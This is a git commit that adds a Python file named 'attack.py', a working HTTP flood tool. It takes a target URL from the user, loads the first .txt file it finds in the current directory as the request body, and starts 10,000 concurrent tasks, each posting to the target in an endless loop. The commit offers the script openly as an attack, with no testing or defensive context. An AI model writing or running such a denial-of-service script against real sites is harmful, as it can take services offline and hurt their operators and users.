470051deefcc8395e2def56269badd6f347c7ad2
Rkebz <gfjhbttnd@gmail.com>
2024-05-26 18:43:56 +0300

    Create attack.py

---
+++ attack.py
@@ -0,0 +1,38 @@
+import aiohttp
+import asyncio
+import os
+
+async def send_request(session, url, data):
+    while True:
+        try:
+            async with session.post(url, data=data) as response:
+                print("Request sent:", response.status)
+        except Exception as e:
+            print("Error:", e)
+
+async def main():
+    target_url = input("Enter the target URL: ")
+
+    data_file_path = find_data_file()
+
+    if data_file_path:
+        print(f"Data file found: {data_file_path}")
+        with open(data_file_path, "r") as file:
+            data = file.read()
+
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            for _ in range(10000):  # تعدد الطلبات
+                task = send_request(session, target_url, data.encode())
+                tasks.append(task)
+            await asyncio.gather(*tasks)
+    else:
+        print("No data file found!")
+
+def find_data_file():
+    for file in os.listdir():
+        if file.endswith(".txt"):
+            return file
+    return None
+
+asyncio.run(main())
